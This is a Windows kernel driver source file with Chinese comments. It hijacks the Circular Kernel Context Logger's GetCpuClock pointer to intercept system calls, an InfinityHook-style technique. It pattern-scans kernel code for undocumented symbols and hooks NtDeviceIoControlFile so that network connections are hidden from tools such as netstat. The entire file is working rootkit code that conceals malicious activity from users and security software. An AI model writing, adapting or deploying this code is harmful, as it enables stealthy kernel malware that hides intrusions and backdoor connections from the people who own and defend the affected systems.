#include "etw.h"
#include "sstd.h"
#include "hook_ioctl.h"
#include "filter.h"
#include "offsets.h"

PVOID cpu_clock;
PVOID cpu_lock_orig;
PULONG64 KiDynamicTraceMask;
const PVOID cpu_lock_wk = WkGetCpuLock;
BOOLEAN g_EnableNetHideSyscallHook = TRUE;

NTSTATUS ModifyTraceSettings(TRACE_TYPE trace_type)
{
	const unsigned long tag = 'wket';

	CKCL_TRACE_PROPERTIES* properties = (CKCL_TRACE_PROPERTIES*)ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, tag);
	if (!properties)
		return STATUS_MEMORY_NOT_ALLOCATED;

	WCHAR* provider_name = (WCHAR*)ExAllocatePoolWithTag(NonPagedPool, 256 * sizeof(WCHAR), tag);
	if (!provider_name)
	{
		ExFreePoolWithTag(properties, tag);
		return STATUS_MEMORY_NOT_ALLOCATED;
	}

	RtlZeroMemory(properties, PAGE_SIZE);
	RtlZeroMemory(provider_name, 256 * sizeof(WCHAR));

	RtlCopyMemory(provider_name, L"Circular Kernel Context Logger", sizeof(L"Circular Kernel Context Logger"));
	RtlInitUnicodeString(&properties->provider_name, (const WCHAR*)provider_name);

	GUID ckcl_session_guid = { 0x54dea73a, 0xed1f, 0x42a4, { 0xaf, 0x71, 0x3e, 0x63, 0xd0, 0x56, 0xf1, 0x74 } };

	properties->event_trace_properties.Wnode.BufferSize = PAGE_SIZE;
	properties->event_trace_properties.Wnode.Flags = 0x00020000;
	properties->event_trace_properties.Wnode.Guid = ckcl_session_guid;
	properties->event_trace_properties.Wnode.ClientContext = 3;
	properties->event_trace_properties.BufferSize = sizeof(unsigned long);
	properties->event_trace_properties.MinimumBuffers = 2;
	properties->event_trace_properties.MaximumBuffers = 2;
	properties->event_trace_properties.LogFileMode = 0x00000400;
	properties->event_trace_properties.EnableFlags = 0x00000080;

	ULONG length = 0;
	NTSTATUS status = NtTraceControl(trace_type, properties, PAGE_SIZE, properties, PAGE_SIZE, &length);

	ExFreePoolWithTag(provider_name, tag);
	ExFreePoolWithTag(properties, tag);

	return status;
}

// 动态查找 KiDynamicTraceMask
static PULONG64 FindKiDynamicTraceMask()
{
	UNICODE_STRING str;
	WCHAR func_name[] = L"KeSetTracepoint";
	RtlInitUnicodeString(&str, func_name);
	PUCHAR func = (PUCHAR)MmGetSystemRoutineAddress(&str);
	
	if (!func)
		return NULL;
	
	// 搜索 lea r??, [rip+offset] 或 mov r??, [rip+offset]
	// 目标是找到对 KiDynamicTraceMask 的引用
	for (ULONG i = 0; i < 0x600; i++)
	{
		__try
		{
			// 48 8B 0D xx xx xx xx - mov rcx, [rip+xx]
			// 48 8D 0D xx xx xx xx - lea rcx, [rip+xx]
			if ((func[i] == 0x48 || func[i] == 0x4C) && 
			    (func[i+1] == 0x8B || func[i+1] == 0x8D))
			{
				UCHAR modrm = func[i+2];
				if ((modrm & 0xC7) == 0x05 || (modrm & 0xC7) == 0x0D ||
				    (modrm & 0xC7) == 0x15 || (modrm & 0xC7) == 0x1D ||
				    (modrm & 0xC7) == 0x25 || (modrm & 0xC7) == 0x2D ||
				    (modrm & 0xC7) == 0x35 || (modrm & 0xC7) == 0x3D)
				{
					LONG offset = *(PLONG)(func + i + 3);
					PULONG64 target = (PULONG64)(func + i + 7 + offset);
					
					if ((ULONG64)target > 0xFFFFF80000000000ULL && MmIsAddressValid(target))
					{
						// KiDynamicTraceMask 应该是一个小的掩码值
						if (*target < 0x10000)
							return target;
					}
				}
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {}
	}
	
	return NULL;
}

NTSTATUS Initialize(ULONG LoggerId)
{
	NTSTATUS status = ModifyTraceSettings(syscall_trace);
	if (!NT_SUCCESS(status))
		return status;

	UNICODE_STRING str;
	WCHAR func_name[] = L"PsGetServerSiloServiceSessionId";
	RtlInitUnicodeString(&str, func_name);
	PVOID func = (ULONG64)MmGetSystemRoutineAddress(&str);

	// 使用动态偏移
	PULONG64 PspHostSiloGlobals = (PULONG64)(*(PULONG32)((LONG64)func + 3) + (LONG64)func + 7);
	PULONG64 EtwpHostSiloState = *(PULONG64)((ULONG64)PspHostSiloGlobals + g_Offsets.SiloGlobals_EtwSiloState);
	PULONG64 EtwpLoggerContext = *(PULONG64)((ULONG64)EtwpHostSiloState + g_Offsets.EtwSiloState_LoggerContext);
	PULONG64 logger_context = (PULONG64)(EtwpLoggerContext[LoggerId]);

	cpu_clock = (PVOID)((ULONG64)logger_context + g_Offsets.LoggerContext_GetCpuClock);
	cpu_lock_orig = InterlockedExchange64(cpu_clock, cpu_lock_wk);

	// 动态查找 KiDynamicTraceMask
	KiDynamicTraceMask = FindKiDynamicTraceMask();

	return STATUS_SUCCESS;
}

ULONG64 WkGetCpuLock()
{
	if (ExGetPreviousMode() == KernelMode)
		goto tag_rdtsc;

	PKTHREAD current_thread = (PKTHREAD)__readgsqword(0x188);
	ULONG systam_call_number = KTHREAD_SYSCALL_NUMBER(current_thread);
	PULONG64 trap_frame = KTHREAD_TRAP_FRAME(current_thread);

	PVOID func = GetSystemServiceRoutineAddress(systam_call_number);
	if (!func)
		goto tag_rdtsc;
	ULONG64 expend_size = IsKernelStackExpend(systam_call_number) * 0x70;

	ULONG64 stack_sub = 0x50 + 0x8 + 0x30 + expend_size;
	if (KiDynamicTraceMask && (*(KiDynamicTraceMask) & 1))
		stack_sub += 0x58;
		
	PULONG magic_pointer1 = (PULONG)((ULONG64)trap_frame - stack_sub);
	PUSHORT magic_pointer2 = (PUSHORT)((ULONG64)trap_frame - stack_sub - 8);
	
	if (*magic_pointer1 != ETW_TRACE_MAGIC_SYSCALL)
		goto tag_rdtsc;

	// NtDeviceIoControlFile hook for netstat hiding
	if (g_EnableNetHideSyscallHook && systam_call_number == SYSCALL_NtDeviceIoControlFile)
	{
		if (*magic_pointer2 == ETW_TRACE_MAGIC_SYSCALL_EXIT)
		{
			__try
			{
				// KTRAP_FRAME 偏移相对稳定
				HANDLE FileHandle = (HANDLE)(*(PULONG64)((ULONG64)trap_frame + 0x80));  // Rcx
				ULONG64 Rsp = *(PULONG64)((ULONG64)trap_frame + 0x180);
				
				PIO_STATUS_BLOCK IoStatusBlock = (PIO_STATUS_BLOCK)(*(PULONG64)(Rsp + 0x28));
				ULONG IoControlCode = (ULONG)(*(PULONG64)(Rsp + 0x30));
				PVOID OutputBuffer = (PVOID)(*(PULONG64)(Rsp + 0x48));
				ULONG OutputBufferLength = (ULONG)(*(PULONG64)(Rsp + 0x50));
				
				HandleDeviceIoControlExit(FileHandle, IoControlCode, OutputBuffer, OutputBufferLength, IoStatusBlock);
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {}
		}
		goto tag_rdtsc;
	}

	// other syscall handling
	{
		PVOID process = KTHREAD_PROCESS(current_thread);
		UNREFERENCED_PARAMETER(process);

		if (*magic_pointer2 == ETW_TRACE_MAGIC_SYSCALL_EXIT)
			goto tag_rdtsc;

		if (*magic_pointer2 == ETW_TRACE_MAGIC_SYSCALL_ENTRY)
		{		
			PULONG64 func_addr = (PVOID)((ULONG64)trap_frame - 0x10 - expend_size);
			PVOID func_stack = (PVOID)*func_addr;
			if (func_stack != func)
				goto tag_rdtsc;
		}
	}
	
tag_rdtsc:
	return __rdtsc();
}
